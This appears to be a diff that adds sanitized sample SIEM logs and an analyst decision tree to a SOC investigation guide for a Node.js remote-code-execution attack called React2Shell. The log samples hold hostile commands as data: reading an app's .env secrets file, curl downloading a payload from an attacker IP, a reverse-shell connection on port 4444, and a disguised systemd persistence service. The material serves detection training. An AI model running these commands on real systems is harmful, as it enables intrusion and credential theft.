@@ -192,7 +192,135 @@ This workflow shows how a SOC analyst should investigate and validate the React2
 
 ## 5. Evidence Pack (Log Samples)
 
+Below are representative log samples aligned with the React2Shell attack chain. 
+These samples are sanitized but realistic enough to demonstrate SIEM investigation skills.
+
+---
+
+### A. Process Execution Logs (Node.js → child_process.exec)
+
+**Sample 1 – Suspicious command execution**
+```
+{
+"Timestamp": "2025-01-11T14:32:08Z",
+"DeviceName": "web-prod-03",
+"Image": "/usr/bin/node",
+"CommandLine": "node app.js child_process.exec('bash -c "whoami"')",
+"ParentImage": "/usr/bin/node",
+"User": "www-data"
+}
+```
+**Sample 2 – Enumeration via RCE**
+```
+{
+"Timestamp": "2025-01-11T14:32:15Z",
+"DeviceName": "web-prod-03",
+"Image": "/bin/bash",
+"CommandLine": "bash -c "cat /var/www/app/.env"",
+"ParentImage": "/usr/bin/node",
+"User": "www-data"
+}
+```
+### B. Network Logs (Reverse Shell Connection)
+
+**Outbound connection to attacker-controlled host**
+```
+{
+"Timestamp": "2025-01-11T14:33:02Z",
+"DeviceName": "web-prod-03",
+"InitiatingProcess": "/bin/bash",
+"RemoteIP": "185.203.112.37",
+"RemotePort": 4444,
+"ConnectionType": "Outbound",
+"Protocol": "TCP"
+}
+```
+---
+
+### C. File Access Logs (Credential Harvesting)
+
+**Access to `.env` file**
+```
+{
+"Timestamp": "2025-01-11T14:32:17Z",
+"DeviceName": "web-prod-03",
+"FileName": "/var/www/app/.env",
+"InitiatingProcess": "/bin/bash",
+"User": "www-data",
+"Action": "Read"
+}
+```
+**Access to app logs**
+```
+{
+"Timestamp": "2025-01-11T14:33:41Z",
+"DeviceName": "web-prod-03",
+"FileName": "/var/www/app/logs/app.log",
+"InitiatingProcess": "/usr/bin/node",
+"Action": "Read"
+}
+```
+---
+
+### D. Persistence Activity Logs (systemd Service)
+
+**Creation of rogue systemd service**
+{
+"Timestamp": "2025-01-11T14:35:12Z",
+"DeviceName": "web-prod-03",
+"CommandLine": "systemctl enable monitoring-agent.service",
+"User": "root",
+"ServiceName": "monitoring-agent.service",
+"ServiceFile": "/etc/systemd/system/monitoring-agent.service"
+}
+
+### E. Ingress Tool Transfer Logs (Payload Download)
+
+{
+"Timestamp": "2025-01-11T14:34:01Z",
+"DeviceName": "web-prod-03",
+"Image": "/usr/bin/curl",
+"CommandLine": "curl http://185.203.112.37/payload.js -o /tmp/payload.js",
+"User": "www-data"
+}
+
+
 ## 6. Analyst Decision Tree
+
+This decision tree guides the analyst from initial alert to final classification without relying on guesswork.
+
+Start
+│
+├── 1. Did the alert originate from a Node.js process running server-side?
+│ ├── No → False positive. Close ticket.
+│ └── Yes → Continue.
+│
+├── 2. Is the process spawning abnormal commands (bash, sh, curl, wget)?
+│ ├── No → Requires deeper manual review. Possible low-risk anomaly.
+│ └── Yes → Continue.
+│
+├── 3. Does the host show outbound connections to suspicious IPs or uncommon ports?
+│ ├── No → Still suspicious. Check file access and service creation.
+│ └── Yes → Likely active exploitation. Continue.
+│
+├── 4. Are sensitive files accessed (.env, logs, config files)?
+│ ├── No → Possible early-stage exploitation. Continue monitoring.
+│ └── Yes → Confirmed credential access. Continue.
+│
+├── 5. Any signs of persistence (systemd service, cron job, startup script)?
+│ ├── No → Partial compromise without persistence.
+│ └── Yes → Full compromise. Immediate containment required.
+│
+├── 6. Attempted lateral movement or internal API calls?
+│ ├── No → Contain and move to eradication.
+│ └── Yes → Escalate to Incident Response lead.
+│
+└── End – Classification
+- If steps 2, 3 and 4 triggered → High Confidence RCE
+- If step 5 triggered → Full System Compromise
+- If only step 2 triggered → Suspicious Execution (Needs Monitoring)
+- If none triggered → Benign
+
 
 ## 7. Containment & Eradication
 
